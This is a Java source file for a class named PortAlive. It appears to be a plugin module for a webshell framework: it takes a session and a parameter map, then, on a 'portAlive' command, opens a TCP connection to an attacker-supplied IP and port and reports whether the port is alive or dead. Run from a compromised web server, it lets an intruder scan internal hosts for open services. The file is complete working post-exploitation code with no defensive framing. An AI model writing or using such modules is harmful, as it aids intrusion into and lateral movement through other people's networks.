import java.util.HashMap;
import java.net.Socket;
import java.net.InetSocketAddress;

public class PortAlive {
    private HashMap parameterMap;
    public static Object Session;

    public PortAlive() {
    }

    public boolean equals(Object paramObject) {
        try {
            this.parameterMap = (HashMap) paramObject;
            this.Session = this.parameterMap.get("httpSession");
        } catch (Exception e) {
            return false;
        }
        return true;
    }

    public String toString() {
        this.parameterMap.put("result", this.run().getBytes());
        this.parameterMap = null;
        return null;
    }

    public String run() {
        String methodName = this.get("methodName");
        try {
            if (methodName == null) {
                return "error:methodName is null";
            }

            if (methodName.equals("portAlive")) {
                String ip = this.get("ip");
                String portValue = this.get("port");
                if (ip == null || ip.length() == 0) {
                    return "error:ip is null";
                }
                if (portValue == null || portValue.length() == 0) {
                    return "error:port is null";
                }
                int port;
                try {
                    port = Integer.parseInt(portValue.trim());
                } catch (Exception e) {
                    return "error:invalid port";
                }
                if (port < 1 || port > 65535) {
                    return "error:invalid port";
                }
                return "ok:" + this.portAlive(ip, port);
            }

            return "error:methodName is not found";
        } catch (Exception e) {
            return "error:" + e.getMessage();
        }
    }

    public String portAlive(String ip, int port) {
        Socket socket = null;
        try {
            socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), 3000);
            return "alive";
        } catch (Exception e) {
            return "dead";
        } finally {
            if (socket != null) {
                try {
                    socket.close();
                } catch (Exception ignored) {
                }
            }
        }
    }

    public String get(String key) {
        Object value = this.parameterMap.get(key);
        if (value == null) {
            return null;
        }
        if (value instanceof String) {
            return (String) value;
        }
        if (value instanceof byte[]) {
            try {
                return new String((byte[]) value, "UTF-8");
            } catch (Exception e) {
                return null;
            }
        }
        return value.toString();
    }
}